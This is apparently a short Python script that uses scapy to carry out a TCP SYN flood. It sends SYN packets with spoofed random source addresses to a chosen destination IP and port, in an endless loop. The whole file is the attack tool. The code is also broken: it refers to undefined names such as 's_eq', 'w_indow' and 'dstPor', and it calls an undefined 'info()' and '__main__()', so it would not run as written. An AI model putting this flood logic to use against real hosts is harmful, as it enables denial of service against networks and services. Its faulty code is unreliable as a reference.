# -*- coding: utf-8 -*-
"""
Created on Wed Dec 16 22:36:13 2020

@author: 86198
"""

from scapy.all import *
import os
import sys
import random

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Flood(dstIP,dstPort):
	total = 0
	print ("Packets are sending ...")
  
	s_port = randInt()
	randInt()
	w = randInt()
	
	IP_Packet = IP ()
	IP_Packet.src = randomIP()
	IP_Packet.dst = dstIP

	TCP_Packet = TCP ()	
	TCP_Packet.sport = s_port
	TCP_Packet.dport = dstPort
	TCP_Packet.flags = "S"
	TCP_Packet.seq = s_eq
	TCP_Packet.window = w_indow

	send(IP_Packet/TCP_Packet, verbose=0)
	total+=1
	sys.stdout.write("\nTotal packets sent: %i\n" % total)
    
if __main__():
	while(1):
# 		SYN_Flood()
		dstIP,dstPort = info()
		SYN_Flood(dstIP,dstPor)